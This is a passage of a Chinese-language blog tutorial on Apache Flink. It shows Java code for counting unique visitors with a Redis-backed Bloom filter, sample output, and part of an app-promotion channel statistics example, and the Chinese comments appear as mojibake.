org.apache.flink.streaming.api.functions.timestamps.BoundedOutOfOrdernessTimestampExtractor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.windowing.ProcessAllWindowFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.triggers.Trigger;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.triggers.TriggerResult;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.windows.TimeWindow;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.runtime.operators.util.AssignerWithPeriodicWatermarksAdapter;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.Collector;</span><br><span class="line"><span class="keyword">import</span> redis.clients.jedis.Jedis;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/5 4:03 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UvWithBloomFilter</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 1. åˆ›å»ºæ‰§è¡Œç¯å¢ƒ</span></span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    <span class="comment">// è®¾ç½®å¹¶è¡Œåº¦ä¸º1</span></span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. ä»csvæ–‡ä»¶ä¸­è·å–æ•°æ®</span></span><br><span class="line">    URL resource = UniqueVisitor.class.getResource(<span class="string">&quot;/UserBehavior.csv&quot;</span>);</span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.readTextFile(resource.getPath());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. è½¬æ¢æˆPOJO,åˆ†é…æ—¶é—´æˆ³å’Œwatermark</span></span><br><span class="line">    DataStream&lt;UserBehavior&gt; dataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">      String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> UserBehavior(<span class="keyword">new</span> Long(fields[<span class="number">0</span>]), <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Integer(fields[<span class="number">2</span>]), fields[<span class="number">3</span>], <span class="keyword">new</span> Long(fields[<span class="number">4</span>]));</span><br><span class="line">    &#125;).assignTimestampsAndWatermarks(<span class="keyword">new</span> AssignerWithPeriodicWatermarksAdapter.Strategy&lt;&gt;(</span><br><span class="line">      <span class="keyword">new</span> BoundedOutOfOrdernessTimestampExtractor&lt;UserBehavior&gt;(Time.of(<span class="number">200</span>, TimeUnit.MILLISECONDS)) &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(UserBehavior element)</span> </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> element.getTimestamp() * <span class="number">1000L</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¼€çª—ç»Ÿè®¡uvå€¼</span></span><br><span class="line">    SingleOutputStreamOperator&lt;PageViewCount&gt; uvStream = dataStream</span><br><span class="line">      .filter(data -&gt; <span class="string">&quot;pv&quot;</span>.equals(data.getBehavior()))</span><br><span class="line">      .timeWindowAll(Time.hours(<span class="number">1</span>))</span><br><span class="line">      .trigger(<span class="keyword">new</span> MyTrigger())</span><br><span class="line">      .process(<span class="keyword">new</span> UvCountResultWithBloomFliter());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    uvStream.print();</span><br><span class="line"></span><br><span class="line">    env.execute(<span class="string">&quot;uv count with bloom filter job&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// è‡ªå®šä¹‰è§¦å‘å™¨</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MyTrigger</span> <span class="keyword">extends</span> <span class="title">Trigger</span>&lt;<span class="title">UserBehavior</span>, <span class="title">TimeWindow</span>&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> TriggerResult <span class="title">onElement</span><span class="params">(UserBehavior element, <span class="keyword">long</span> timestamp, TimeWindow window, TriggerContext ctx)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">// æ¯ä¸€æ¡æ•°æ®æ¥åˆ°ï¼Œç›´æ¥è§¦å‘çª—å£è®¡ç®—ï¼Œå¹¶ä¸”ç›´æ¥æ¸…ç©ºçª—å£</span></span><br><span class="line">      <span class="keyword">return</span> TriggerResult.FIRE_AND_PURGE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> TriggerResult <span class="title">onProcessingTime</span><span class="params">(<span class="keyword">long</span> time, TimeWindow window, TriggerContext ctx)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> TriggerResult.CONTINUE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> TriggerResult <span class="title">onEventTime</span><span class="params">(<span class="keyword">long</span> time, TimeWindow window, TriggerContext ctx)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> TriggerResult.CONTINUE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">clear</span><span class="params">(TimeWindow window, TriggerContext ctx)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// è‡ªå®šä¹‰ä¸€ä¸ªå¸ƒéš†è¿‡æ»¤å™¨</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MyBloomFilter</span> </span>&#123;</span><br><span class="line">    <span class="comment">// å®šä¹‰ä½å›¾çš„å¤§å°ï¼Œä¸€èˆ¬éœ€è¦å®šä¹‰ä¸º2çš„æ•´æ¬¡å¹‚</span></span><br><span class="line">    <span class="keyword">private</span> Integer cap;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyBloomFilter</span><span class="params">(Integer cap)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.cap = cap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å®ç°ä¸€ä¸ªhashå‡½æ•°</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">hashCode</span><span class="params">(String value, Integer seed)</span> </span>&#123;</span><br><span class="line">      Long result = <span class="number">0L</span>;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; value.length(); i++) &#123;</span><br><span class="line">        result = result * seed + value.charAt(i);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> result &amp; (cap - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å®ç°è‡ªå®šä¹‰çš„å¤„ç†å‡½æ•°</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">UvCountResultWithBloomFliter</span> <span class="keyword">extends</span> <span class="title">ProcessAllWindowFunction</span>&lt;<span class="title">UserBehavior</span>, <span class="title">PageViewCount</span>, <span class="title">TimeWindow</span>&gt; </span>&#123;</span><br><span class="line">    <span class="comment">// å®šä¹‰jedisè¿æ¥å’Œå¸ƒéš†è¿‡æ»¤å™¨</span></span><br><span class="line">    Jedis jedis;</span><br><span class="line">    MyBloomFilter myBloomFilter;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">(Configuration parameters)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      jedis = <span class="keyword">new</span> Jedis(<span class="string">&quot;localhost&quot;</span>, <span class="number">6379</span>);</span><br><span class="line">      myBloomFilter = <span class="keyword">new</span> MyBloomFilter(<span class="number">1</span> &lt;&lt; <span class="number">29</span>);    <span class="comment">// è¦å¤„ç†1äº¿ä¸ªæ•°æ®ï¼Œç”¨64MBå¤§å°çš„ä½å›¾</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">(Context context, Iterable&lt;UserBehavior&gt; elements, Collector&lt;PageViewCount&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">// å°†ä½å›¾å’Œçª—å£countå€¼å…¨éƒ¨å­˜å…¥redisï¼Œç”¨windowEndä½œä¸ºkey</span></span><br><span class="line">      Long windowEnd = context.window().getEnd();</span><br><span class="line">      String bitmapKey = windowEnd.toString();</span><br><span class="line">      <span class="comment">// æŠŠcountå€¼å­˜æˆä¸€å¼ hashè¡¨</span></span><br><span class="line">      String countHashName = <span class="string">&quot;uv_count&quot;</span>;</span><br><span class="line">      String countKey = windowEnd.toString();</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 1. å–å½“å‰çš„userId</span></span><br><span class="line">      Long userId = elements.iterator().next().getUerId();</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 2. è®¡ç®—ä½å›¾ä¸­çš„offset</span></span><br><span class="line">      Long offset = myBloomFilter.hashCode(userId.toString(), <span class="number">61</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 3. ç”¨redisçš„getbitå‘½ä»¤ï¼Œåˆ¤æ–­å¯¹åº”ä½ç½®çš„å€¼</span></span><br><span class="line">      Boolean isExist = jedis.getbit(bitmapKey, offset);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!isExist) &#123;</span><br><span class="line">        <span class="comment">// å¦‚æœä¸å­˜åœ¨ï¼Œå¯¹åº”ä½å›¾ä½ç½®ç½®1</span></span><br><span class="line">        jedis.setbit(bitmapKey, offset, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ›´æ–°redisä¸­ä¿å­˜çš„countå€¼</span></span><br><span class="line">        Long uvCount = <span class="number">0L</span>;    <span class="comment">// åˆå§‹countå€¼</span></span><br><span class="line">        String uvCountString = jedis.hget(countHashName, countKey);</span><br><span class="line">        <span class="keyword">if</span> (uvCountString != <span class="keyword">null</span> &amp;&amp; !<span class="string">&quot;&quot;</span>.equals(uvCountString)) &#123;</span><br><span class="line">          uvCount = Long.valueOf(uvCountString);</span><br><span class="line">        &#125;</span><br><span class="line">        jedis.hset(countHashName, countKey, String.valueOf(uvCount + <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        out.collect(<span class="keyword">new</span> PageViewCount(<span class="string">&quot;uv&quot;</span>, windowEnd, uvCount + <span class="number">1</span>));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      jedis.close();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> è¾“å‡º  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">....</span><br><span class="line">PageViewCount&#123;url=&#x27;uv&#x27;, windowEnd=1511661600000, count=7469&#125;</span><br><span class="line">PageViewCount&#123;url=&#x27;uv&#x27;, windowEnd=1511661600000, count=7470&#125;</span><br><span class="line">PageViewCount&#123;url=&#x27;uv&#x27;, windowEnd=1511661600000, count=7471&#125;</span><br><span class="line">PageViewCount&#123;url=&#x27;uv&#x27;, windowEnd=1511661600000, count=7472&#125;</span><br><span class="line">PageViewCount&#123;url=&#x27;uv&#x27;, windowEnd=1511661600000, count=7473&#125;</span><br><span class="line">PageViewCount&#123;url=&#x27;uv&#x27;, windowEnd=1511661600000, count=7474&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></li></ul><h5 id="å¸‚åœºè¥é”€åˆ†æâ€”â€”APPå¸‚åœºæ¨å¹¿ç»Ÿè®¡"><a href="#å¸‚åœºè¥é”€åˆ†æâ€”â€”APPå¸‚åœºæ¨å¹¿ç»Ÿè®¡" class="headerlink" title="å¸‚åœºè¥é”€åˆ†æâ€”â€”APPå¸‚åœºæ¨å¹¿ç»Ÿè®¡"></a>å¸‚åœºè¥é”€åˆ†æâ€”â€”APPå¸‚åœºæ¨å¹¿ç»Ÿè®¡</h5><ul><li>åŸºæœ¬éœ€æ±‚ <ul><li>ä»åŸ‹ç‚¹æ—¥å¿—ä¸­ï¼Œç»Ÿè®¡APPå¸‚åœºæ¨å¹¿çš„æ•°æ®æŒ‡æ ‡</li><li>æŒ‰ç…§ä¸åŒçš„æ¨å¹¿æ¸ é“ï¼Œåˆ†åˆ«ç»Ÿè®¡æ•°æ®</li></ul></li><li>è§£å†³æ€è·¯ <ul><li>é€šè¿‡è¿‡æ»¤æ—¥å¿—ä¸­çš„ç”¨æˆ·è¡Œä¸ºï¼ŒæŒ‰ç…§ä¸åŒçš„æ¸ é“è¿›è¡Œç»Ÿè®¡</li><li>å¯ä»¥ç”¨process functionå¤„ç†ï¼Œå¾—åˆ°è‡ªå®šä¹‰çš„è¾“å‡ºæ•°æ®ä¿¡æ¯</li></ul></li></ul><h6 id="POJO-2"><a href="#POJO-2" class="headerlink" title="POJO"></a>POJO</h6><ul><li><p> MarketingUserBehavior  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Long userId;</span><br><span class="line"><span class="keyword">private</span> String behavior;</span><br><span class="line"><span class="keyword">private</span> String channel;</span><br><span class="line"><span class="keyword">private</span> Long timestamp;</span><br></pre></td></tr></table></figure></li><li><p> ChannelPromotionCount  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> String channel;</span><br><span class="line"><span class="keyword">private</span> String behavior;</span><br><span class="line"><span class="keyword">private</span> String windowEnd;</span><br><span class="line"><span class="keyword">private</span> Long count;</span><br></pre></td></tr></table></figure></li></ul><h6 id="ä»£ç 1-è‡ªå®šä¹‰æµ‹è¯•æ•°æ®æº"><a href="#ä»£ç 1-è‡ªå®šä¹‰æµ‹è¯•æ•°æ®æº" class="headerlink" title="ä»£ç 1-è‡ªå®šä¹‰æµ‹è¯•æ•°æ®æº"></a>ä»£ç 1-è‡ªå®šä¹‰æµ‹è¯•æ•°æ®æº</h6><ul><li> javaä»£ç   <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> beans.MarketingUserBehavior;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.source.SourceFunction;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/5 5:32 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AppMarketingByChannel</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. ä»è‡ªå®šä¹‰æ•°æ®æºä¸­è¯»å–æ•°æ®</span></span><br><span class="line">    DataStream&lt;MarketingUserBehavior&gt; dataStream = env.addSource(<span class="keyword">new</span> SimulatedMarketingUserBehaviorSource());</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å®ç°è‡ªå®šä¹‰çš„æ¨¡æ‹Ÿå¸‚åœºç”¨æˆ·è¡Œä¸ºæ•°æ®æº</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SimulatedMarketingUserBehaviorSource</span> <span class="keyword">implements</span> <span class="title">SourceFunction</span>&lt;<span class="title">MarketingUserBehavior</span>&gt; </span>&#123;</span><br><span class="line">    <span class="comment">// æ§åˆ¶æ˜¯å¦æ­£å¸¸è¿è¡Œçš„æ ‡è¯†ä½</span></span><br><span class="line">    Boolean running = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å®šä¹‰ç”¨æˆ·è¡Œä¸ºå’Œæ¸ é“çš„èŒƒå›´</span></span><br><span class="line">    List&lt;String&gt; behaviorList = Arrays.asList(<span class="string">&quot;CLICK&quot;</span>, <span class="string">&quot;DOWNLOAD&quot;</span>, <span class="string">&quot;INSTALL&quot;</span>, <span class="string">&quot;UNINSTALL&quot;</span>);</span><br><span class="line">    List&lt;String&gt; channelList = Arrays.asList(<span class="string">&quot;app store&quot;</span>, <span class="string">&quot;wechat&quot;</span>, <span class="string">&quot;weibo&quot;</span>);</span><br><span class="line"></span><br><span class="line">    Random random = <span class="keyword">new</span> Random();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">(SourceContext&lt;MarketingUserBehavior&gt; ctx)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="keyword">while</span> (running) &#123;</span><br><span class="line">        <span class="comment">// éšæœºç”Ÿæˆæ‰€æœ‰å­—æ®µ</span></span><br><span class="line">        Long id = random.nextLong();</span><br><span class="line">        String behavior = behaviorList.get(random.nextInt(behaviorList.size()));</span><br><span class="line">        String channel = channelList.get(random.nextInt(channelList.size()));</span><br><span class="line">        Long timestamp = System.currentTimeMillis();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å‘å‡ºæ•°æ®</span></span><br><span class="line">        ctx.collect(<span class="keyword">new</span> MarketingUserBehavior(id, behavior, channel, timestamp));</span><br><span class="line"></span><br><span class="line">        Thread.sleep(<span class="number">100L</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">cancel</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      running = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h6 id="ä»£ç 2-å…·ä½“å®ç°"><a href="#ä»£ç 2-å…·ä½“å®ç°" class="headerlink" title="ä»£ç 2-å…·ä½“å®ç°"></a>ä»£ç 2-å…·ä½“å®ç°</h6><ul><li><p> javaä»£ç   </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> beans.ChannelPromotionCount;</span><br><span class="line"><span class="keyword">import</span> beans.MarketingUserBehavior;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.AggregateFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.functions.KeySelector;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.tuple.Tuple2;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.source.SourceFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.timestamps.BoundedOutOfOrdernessTimestampExtractor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.windowing.ProcessWindowFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.assigners.SlidingEventTimeWindows;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.assigners.TumblingEventTimeWindows;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.assigners.TumblingProcessingTimeWindows;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.windows.TimeWindow;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.runtime.operators.util.AssignerWithPeriodicWatermarksAdapter;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.Collector;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Timestamp;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/5 5:32 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AppMarketingByChannel</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. ä»è‡ªå®šä¹‰æ•°æ®æºä¸­è¯»å–æ•°æ®</span></span><br><span class="line">    DataStream&lt;MarketingUserBehavior&gt; dataStream = env.addSource(<span class="keyword">new</span> SimulatedMarketingUserBehaviorSource())</span><br><span class="line">      .assignTimestampsAndWatermarks(<span class="keyword">new</span> AssignerWithPeriodicWatermarksAdapter.Strategy&lt;&gt;(</span><br><span class="line">        <span class="keyword">new</span> BoundedOutOfOrdernessTimestampExtractor&lt;MarketingUserBehavior&gt;(Time.of(<span class="number">200</span>, TimeUnit.MILLISECONDS)) &#123;</span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">          <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(MarketingUserBehavior element)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> element.getTimestamp();</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      ));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. åˆ†æ¸ é“å¼€çª—ç»Ÿè®¡</span></span><br><span class="line">    DataStream&lt;ChannelPromotionCount&gt; resultStream = dataStream</span><br><span class="line">      .filter(data -&gt; !<span class="string">&quot;UNINSTALL&quot;</span>.equals(data.getBehavior()))</span><br><span class="line">      .keyBy(<span class="keyword">new</span> KeySelector&lt;MarketingUserBehavior, Tuple2&lt;String, String&gt;&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Tuple2&lt;String, 